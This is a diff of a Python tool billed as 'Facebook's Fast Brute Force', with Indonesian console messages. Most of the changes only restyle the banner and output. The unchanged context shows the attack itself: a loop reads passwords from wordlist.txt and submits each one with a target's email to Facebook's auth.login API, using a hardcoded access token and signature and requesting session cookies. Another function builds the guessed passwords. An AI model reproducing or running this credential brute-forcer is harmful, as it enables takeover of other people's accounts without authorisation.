@@ -32,8 +32,8 @@ def banner():
    |    |  \_/ __ \  \/ //|  ||    |  \\
    |    `   \  ___/\   // |  ||    `   \\
   /_______  /\___  >\_//  |__/_______  //\033[37;1m
-     v.01 \033[36;1m\//    \//  \033[37;1m By IqbalDev \033[36;1m  \//\033[31;1m
-  Facebook's\033[30;1m Fast Brute Force \033[31;1m Tools''')
+     v.01 \033[36;1m\//    \//  \033[37;1m    By IqbalDev\033[36;1m\//\033[31;1m
+   Facebook's\033[30;1m Fast Brute Force \033[31;1m Tools''')
 banner()
 
 
@@ -70,9 +70,11 @@ def login():
 		runn(m+" Login gagal.........")
 		sys.exit()
 
-	except:
+	except KeyboardInterrupt:
 
 	    print
+            print d+" Keluar.."
+            sys.exit()
 
 	else:
 	    wordlist()
@@ -94,7 +96,7 @@ def brute_fast():
                 san_dev = open("wordlist.txt", "r")
                 for pas in san_dev:
                     pas = pas.replace("\n", "")
-                    sys.stdout.write("\r Mencoba ==> " + pas)
+                    sys.stdout.write("\r "+h+"["+p+"~√"+h+"]"+p+" Mencoba Password "+a+"==> " +d+ pas)
                     sys.stdout.flush()
                     Dev_ID = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pas + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     dev = json.loads(Dev_ID.text)
@@ -440,7 +442,8 @@ def wordlist():
                 file.write(pas251+b +pas252+b +pas253+b)
 		file.close()
                 print
-		print " Sukses mengambil informasi"
+		print m+" ✓"+h+" Sukses mengambil informasi.."
+                print
 		brute_fast()
 
 
